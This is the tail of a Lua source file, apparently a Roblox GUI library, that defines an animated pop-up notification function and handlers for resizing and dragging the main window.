	NotificationBar.Name = "NotificationBar"
	NotificationBar.Parent = ScreenGui
	NotificationBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	NotificationBar.BackgroundTransparency = 1.000
	NotificationBar.BorderColor3 = Color3.fromRGB(27, 42, 53)
	NotificationBar.BorderSizePixel = 0
	NotificationBar.Position = UDim2.new(0, 10, 0, 10)
	NotificationBar.Size = UDim2.new(0, 200, 1, -20)
	NotificationBar.ZIndex = -1000

	UIListLayout.Parent = NotificationBar
	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout.Padding = UDim.new(0, 10)
------------------------------------通知窗口1-------------------------------------------------------------------------------------------------------------
	function WindowLibrary:Notify(setup)
		setup = setup or {};
		setup.Title = setup.Title or "Norification";
		setup.Duration = setup.Duration or 5;
		setup.Description = setup.Description or setup.Desc or "Description";

		local Notification = Instance.new("Frame")
		local DropShadow = Instance.new("ImageLabel")
		local Title = Instance.new("TextLabel")
		local Close = Instance.new("TextButton")
		local Message = Instance.new("TextLabel")

		local OpenAnimation = function()
			Library:Tween(Notification,Library.TweenLibrary.SmallEffect,{

				BackgroundTransparency = 0.3
			})

			Library:Tween(DropShadow,Library.TweenLibrary.SmallEffect,{
				ImageTransparency = 0.500
			})

			Library:Tween(Title,Library.TweenLibrary.SmallEffect,{
				TextStrokeTransparency = 0.950,
				TextTransparency = 0
			})

			Library:Tween(Close,Library.TweenLibrary.SmallEffect,{
				TextStrokeTransparency = 0.950,
				TextTransparency = 0
			})

			Library:Tween(Message,Library.TweenLibrary.SmallEffect,{
				TextStrokeTransparency = 0.950,
				TextTransparency = 0
			})
		end;

		local CloseAnimation = function()
			Library:Tween(Notification,Library.TweenLibrary.SmallEffect,{
				Size = UDim2.new(0, Notification.Size.X.Offset, 0, 0),
				BackgroundTransparency = 1
			})

			Library:Tween(DropShadow,Library.TweenLibrary.WindowChangedFast,{
				ImageTransparency = 1
			})

			Library:Tween(Title,Library.TweenLibrary.WindowChangedFast,{
				TextStrokeTransparency = 1,
				TextTransparency = 1,
			})

			Library:Tween(Close,Library.TweenLibrary.WindowChangedFast,{
				TextStrokeTransparency = 1,
				TextTransparency = 1
			})

			Library:Tween(Message,Library.TweenLibrary.WindowChangedFast,{
				TextStrokeTransparency = 1,
				TextTransparency = 1,
			})
		end;

		Notification.Name = "Notification"
		Notification.Parent = NotificationBar
		Notification.BackgroundColor3 = Library.Colors.Default
		Notification.BackgroundTransparency = 1
		Notification.BorderColor3 = Color3.fromRGB(27, 42, 53)
		Notification.BorderSizePixel = 0
		Notification.Size = UDim2.new(0, 400, 0, 250) -- 调整窗口的初始大小
		Notification.ZIndex = 0

		DropShadow.Name = "DropShadow"
		DropShadow.Parent = Notification
		DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		DropShadow.BackgroundTransparency = 1.000
		DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
		DropShadow.Position = UDim2.new(0, -5, 0, -5)
		DropShadow.Size = UDim2.new(1, 10, 1, 10)
		DropShadow.ZIndex = -5
		DropShadow.Image = "rbxassetid://297694300"
		DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
		DropShadow.ImageTransparency = 1
		DropShadow.ScaleType = Enum.ScaleType.Slice
		DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
		DropShadow.SliceScale = 0.050

		Title.Name = "Title"
		Title.Parent = Notification
		Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Title.BackgroundTransparency = 1.000
		Title.BorderColor3 = Color3.fromRGB(27, 42, 53)
		Title.BorderSizePixel = 0
		Title.Position = UDim2.new(0, 25, 0, 5)
		Title.Size = UDim2.new(1, -50, 0, 14)
		Title.ZIndex = 0
		Title.Font = Enum.Font.Gotham
		Title.Text = setup.Title
		Title.TextColor3 = Library.Colors.TextColor
		Title.TextScaled = true
		Title.TextSize = 14.000
		Title.TextStrokeColor3 = Color3.fromRGB(220, 224, 234)
		Title.TextStrokeTransparency = 1
		Title.TextWrapped = true
		Title.TextTransparency = 1
		Title.RichText = true

		Close.Name = "Close"
		Close.Parent = Notification
		Close.Active = false
		Close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Close.BackgroundTransparency = 1.000
		Close.BorderColor3 = Color3.fromRGB(27, 42, 53)
		Close.BorderSizePixel = 0
		Close.Position = UDim2.new(1, -25, 0, 0)
		Close.Selectable = false
		Close.Size = UDim2.new(0, 25, 0, 25)
		Close.ZIndex = 0
		Close.Font = Enum.Font.Gotham
		Close.Text = "×"
		Close.TextColor3 = Color3.fromRGB(220, 224, 234)
		Close.TextSize = 20.000
		Close.TextStrokeColor3 = Color3.fromRGB(220, 224, 234)
		Close.TextStrokeTransparency = 0.950
		Close.TextTransparency = 1

		Message.Name = "Message"
		Message.Parent = Notification
		Message.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Message.BackgroundTransparency = 1.000
		Message.BorderColor3 = Color3.fromRGB(27, 42, 53)
		Message.BorderSizePixel = 0
		Message.Position = UDim2.new(0, 10, 0, 22)
		Message.Size = UDim2.new(1, -20, 1, 0)
		Message.ZIndex = 0
		Message.Font = Enum.Font.Gotham
		Message.Text = setup.Description
		Message.TextColor3 = Library.Colors.TextColor
		Message.TextSize = 12.000
		Message.TextStrokeColor3 = Color3.fromRGB(220, 224, 234)
		Message.TextStrokeTransparency = 0.950
		Message.TextWrapped = true
		Message.TextXAlignment = Enum.TextXAlignment.Left
		Message.TextYAlignment = Enum.TextYAlignment.Top
		Message.TextTransparency = 1
		Message.RichText = true;

		local update = function()

			local size = Library:GetTextSize(Message.Text:gsub("<.->", ""),Message.TextSize,Message.Font)
			local SIZE2 = Library:GetTextSize(Title.Text:gsub("<.->", ""),Title.TextSize,Title.Font)
			
			local mainx = ((SIZE2.X > size.X) and SIZE2.X) or size.X
			Library:Tween(Notification,Library.TweenLibrary.BinEffect,{
				Size = UDim2.new(0, mainx + 35, 0, (10 + size.Y) + Title.AbsoluteSize.Y),
				BackgroundTransparency = 0.3
			})
		end;

		OpenAnimation()
		update();

		local attr = false;
		Close.MouseButton1Click:Connect(function()
			attr = true
			CloseAnimation()

			task.delay(0.25,function()
				Notification:Destroy()
			end)
		end);

		spawn(function()
			update();

			task.wait(setup.Duration);
			if attr then
				return;
			end;

			CloseAnimation()

			task.delay(0.25,function()
				Notification:Destroy()
			end)
		end)
	end;

	Resize.InputBegan:Connect(function(std)
		if std.UserInputType == Enum.UserInputType.MouseButton1 or std.UserInputType == Enum.UserInputType.Touch then
			IsHold = true
			if Library.UserInputService.TouchEnabled then
				Resize.Size = UDim2.new(0.15000003, 85, 0.15000003, 85)
			end
		end
	end)

	Resize.InputEnded:Connect(function(std)
		if std.UserInputType == Enum.UserInputType.MouseButton1 or std.UserInputType == Enum.UserInputType.Touch then
			IsHold = false
			Resize.Size = UDim2.new(0.075000003, 0, 0.075000003, 0)
		end
	end)

	Library.UserInputService.InputChanged:Connect(function(input)
		if IsHold and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
			if WindowLibrary.Toggle then
				local pios = input.Position;
				
				local x = (pios.X - MainFrame.AbsolutePosition.X) 
				local y = (pios.Y - MainFrame.AbsolutePosition.Y) 

				if x < 460 then x = 460 end
				if y < 310 then y = 310 end

				local Offset = UDim2.new(0,x,0,y)
				local plus = UDim2.fromOffset(-(MainFrame.AbsoluteSize.X - x) / 2, -(MainFrame.AbsoluteSize.Y - y) / 2);

				setup.Size = Offset

				Library:Tween(MainFrame , Library.TweenLibrary.FastEffect,{
					Size = Offset,
					Position = MainFrame.Position + plus,
				})

				WindowLibrary.SavedPosition = MainFrame.Position + plus
			end
		end;

		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input);
			end;
		end;
	end)

	return WindowLibrary;
end;

return Library;